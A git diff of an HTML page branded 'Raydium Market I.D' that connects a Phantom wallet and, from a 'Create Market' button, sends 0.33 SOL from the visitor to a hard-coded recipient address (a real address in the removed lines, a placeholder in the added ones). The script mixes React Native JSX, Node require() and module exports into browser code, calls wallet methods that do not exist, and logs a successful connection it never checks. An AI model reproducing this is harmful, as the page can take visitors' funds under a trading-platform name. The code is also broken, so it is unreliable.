@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Raydium Market I.D</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
@@ -124,11 +124,7 @@
     </style>
 </head>
 <body>
-	 <h1>Solana Web3.js Example</h1>
-    <button id="generateKeyPairBtn">Generate Keypair</button>
-    <button id="createTransactionBtn">Create Transaction</button>
-    <button id="sendTransactionBtn">Send Transaction</button>
-<header>
+    <header>
         <nav class="navbar navbar-light navbar-expand-lg" aria-label="Offcanvas navbar large">
             <div class="container">
                 <a class="navbar-brand" href="/">
@@ -164,7 +160,7 @@
         <button class="btn btn-primary phantom-connect">Connect with Phantom Wallet</button> <!-- Added the Connect Wallet button -->
     </header>
 
-   <div class="container para-note text-center sliderArea mt-5">
+    <div class="container para-note text-center sliderArea mt-5">
         <div class="swiper mySwiper">
             <div class="swiper-wrapper">
                 <div class="swiper-slide">
@@ -245,33 +241,20 @@
     <footer class="color-footer bg-body-tertiary text-center text-lg-start">
         <div class="text-center p-3">Copyright © 2024 Raydium Market ID. All rights reserved.</div>
     </footer>
- <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+
+    <button id="sendTransactionBtn">Send Transaction (0.33 SOL)</button>
+
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 
     <!-- Include Phantom Wallet Script -->
     <script src="https://solana.com/phantom/assets/phantom.js"></script>
 
-   
     <script>
-        document.getElementById("generateKeyPairBtn").addEventListener("click", function() {
-            const { Keypair } = solanaWeb3;
-            let keypair = Keypair.generate();
-            console.log("Generated Keypair:", keypair);
-        });
-
-        document.getElementById("createTransactionBtn").addEventListener("click", function() {
-            // Your code to create a transaction
-        });
-
         document.getElementById("sendTransactionBtn").addEventListener("click", function() {
-            // Your code to send a transaction
-        });
-	     <script>
-        // JavaScript code for Solana Web3.js functionality
-        document.addEventListener("DOMContentLoaded", function () {
-            const { Keypair, SystemProgram, LAMPORTS_PER_SOL, Connection } = solanaWeb3;
+            const { Keypair, SystemProgram, Connection } = solanaWeb3;
 
             // Your wallet address
-            const yourWalletAddress = "<9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar>";
+            const yourWalletAddress = "<Your_Wallet_Address>";
 
             // Function to create and send a transaction
             function createAndSendTransaction() {
@@ -304,136 +287,116 @@
             }
 
             // Call the createAndSendTransaction function when a button is clicked
-            document.getElementById("sendTransactionBtn").addEventListener("click", createAndSendTransaction);
+            createAndSendTransaction();
         });
-    </script>
 
-    <!-- Your HTML content here -->
-    <button id="sendTransactionBtn">Send Transaction (0.33 SOL)</button>
+        // Initiate a new connection to Phantom
+        const connect = async () => {
+            const params = {
+                cluster: "devnet",
+                app_url: "https://crypdaddy.github.io/",
+            };
 
-	    // Initiate a new connection to Phantom
-  const connect = async () => {
-    // TODO
-    const params = {
-      cluster: "devnet",
-      app_url: "https://crypdaddy.github.io/",
-    };
+            const url = "https://phantom.app/ul/v1/connect";
+            Linking.openURL(url);
+        };
 
-    const url = "https://phantom.app/ul/v1/connect";
-    Linking.openURL(url);
-  };
+        const functionName = () => {
+            return (
+                <React.Fragment>
+                    {phantomWalletPublicKey ? ( // If phantomWalletPublicKey exists
+                        <> {/* Fragments - used to return multiple elements without a wrapper */}
+                            <View style={[styles.row, styles.wallet]}> {/* View component with styles */}
+                                <View style={styles.greenDot} /> {/* View component with greenDot style */}
+                                <Text
+                                    style={styles.text}
+                                    numberOfLines={1}
+                                    ellipsizeMode="middle"
+                                >
+                                    {`Connected to: ${phantomWalletPublicKey.toString()}`} {/* Text component displaying connection information */}
+                                </Text>
+                            </View>
+                            <View style={styles.row}> {/* Another View component with row style */}
+                                <Button title="Add Review" onPress={openAddReviewSheet} /> {/* Button component to add review */}
+                                <Button title="Disconnect" onPress={disconnect} /> {/* Button component to disconnect */}
+                            </View>
+                        </>
+                    ) : ( // If phantomWalletPublicKey does not exist
+                        <View style={{ marginTop: 15 }}> {/* View component with marginTop */}
+                            <Button title="Connect Phantom" onPress={connect} /> {/* Button component to connect */}
+                        </View>
+                    )}
 
-const functionName = () => {
-    return (
-        <React.Fragment>
-            {phantomWalletPublicKey ? ( // If phantomWalletPublicKey exists
-    <> // Fragments - used to return multiple elements without a wrapper
-        <View style={[styles.row, styles.wallet]}> {/* View component with styles */}
-            <View style={styles.greenDot} /> {/* View component with greenDot style */}
-            <Text
-                style={styles.text}
-                numberOfLines={1}
-                ellipsizeMode="middle"
-            >
-                {`Connected to: ${phantomWalletPublicKey.toString()}`} {/* Text component displaying connection inhtmlFormation */}
-            </Text>
-        </View>
-        <View style={styles.row}> {/* Another View component with row style */}
-            <Button title="Add Review" onPress={openAddReviewSheet} /> {/* Button component to add review */}
-            <Button title="Disconnect" onPress={disconnect} /> {/* Button component to disconnect */}
-        </View>
-    </>
-) : ( // If phantomWalletPublicKey does not exist
-    <View style={{ marginTop: 15 }}> {/* View component with marginTop */}
-        <Button title="Connect Phantom" onPress={connect} /> {/* Button component to connect */}
-    </View>
-)}
-
-        </React.Fragment>
-    )
-}
-
-export default functionName
-    // Function to handle the connection to Phantom wallet
-async function connectToPhantom() {
-    const url = "https://phantom.app/ul/v1/connect";
-
-    try {
-        // Open the URL to connect to Phantom wallet
-        window.open(url);
-        console.log("Connected to Phantom wallet successfully!");
-    } catch (error) {
-        console.error("Error connecting to Phantom wallet:", error);
-    }
-}
-
-// Attach click event listener to the "Connect with Phantom Wallet" button
-document.querySelector('.phantom-connect').addEventListener('click', async () => {
-    try {
-        // Call the function to connect to Phantom wallet
-        await connectToPhantom();
-    } catch (error) {
-        console.error("Error:", error);
-    }
-});
-
-
-// Function to handle the transaction
-async function sendTransaction() {
-    // Your send transaction logic here
-}
-
-// Attach click event listener to the "Create Market" button
-document.querySelector('.create-market').addEventListener('click', async () => {
-    try {
-        // Call the function to send the transaction
-        await sendTransaction();
-    } catch (error) {
-        console.error("Error:", error);
-    }
-});
-
-     // Function to handle the transaction
-async function sendTransaction() {
-  const { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = require("@solana/web3.js");
-
-  // Specify the recipient's public key
-  const recipientPublicKey = new PublicKey("9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar");
-
-  // Create a transaction object
-  const transaction = new Transaction().add(
-    SystemProgram.transfer({
-      fromPubkey: window.solana.publicKey,
-      toPubkey: recipientPublicKey,
-      lamports: 0.33 * LAMPORTS_PER_SOL, // Sending 0.33 SOL
-    })
-  );
-
-  try {
-    // Send and confirm the transaction
-    const signature = await window.solana.sendAndConfirmTransaction(transaction, [window.solana]);
-    console.log("Transaction successful! Signature:", signature);
-  } catch (error) {
-    // Handle transaction failure
-    console.error("Error sending transaction:", error);
-  }
-}
-
-// Attach click event listener to the "Create Market" button
-document.querySelector('.create-market').addEventListener('click', async () => {
-    try {
-        // Ensure that the solana object is available
-        if (window.solana) {
-            // Call the function to send the transaction
-            await sendTransaction();
-        } else {
-            console.error("Solana object not available. Make sure to connect to Phantom wallet first.");
+                </React.Fragment>
+            )
         }
-    } catch (error) {
-        // Handle any errors that may occur
-        console.error("Error:", error);
-    }
-});
+
+        export default functionName
+
+        // Function to handle the connection to Phantom wallet
+        async function connectToPhantom() {
+            const url = "https://phantom.app/ul/v1/connect";
+
+            try {
+                // Open the URL to connect to Phantom wallet
+                window.open(url);
+                console.log("Connected to Phantom wallet successfully!");
+            } catch (error) {
+                console.error("Error connecting to Phantom wallet:", error);
+            }
+        }
+
+        // Attach click event listener to the "Connect with Phantom Wallet" button
+        document.querySelector('.phantom-connect').addEventListener('click', async () => {
+            try {
+                // Call the function to connect to Phantom wallet
+                await connectToPhantom();
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        });
+
+        // Function to handle the transaction
+        async function sendTransaction() {
+            const { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = require("@solana/web3.js");
+
+            // Specify the recipient's public key
+            const recipientPublicKey = new PublicKey("Your_Wallet_Address");
+
+            // Create a transaction object
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: window.solana.publicKey,
+                    toPubkey: recipientPublicKey,
+                    lamports: 0.33 * LAMPORTS_PER_SOL, // Sending 0.33 SOL
+                })
+            );
+
+            try {
+                // Send and confirm the transaction
+                const signature = await window.solana.sendAndConfirmTransaction(transaction, [window.solana]);
+                console.log("Transaction successful! Signature:", signature);
+            } catch (error) {
+                // Handle transaction failure
+                console.error("Error sending transaction:", error);
+            }
+        }
+
+        // Attach click event listener to the "Create Market" button
+        document.querySelector('.create-market').addEventListener('click', async () => {
+            try {
+                // Ensure that the solana object is available
+                if (window.solana) {
+                    // Call the function to send the transaction
+                    await sendTransaction();
+                } else {
+                    console.error("Solana object not available. Make sure to connect to Phantom wallet first.");
+                }
+            } catch (error) {
+                // Handle any errors that may occur
+                console.error("Error:", error);
+            }
+        });
     </script>
 </body>
 </html>
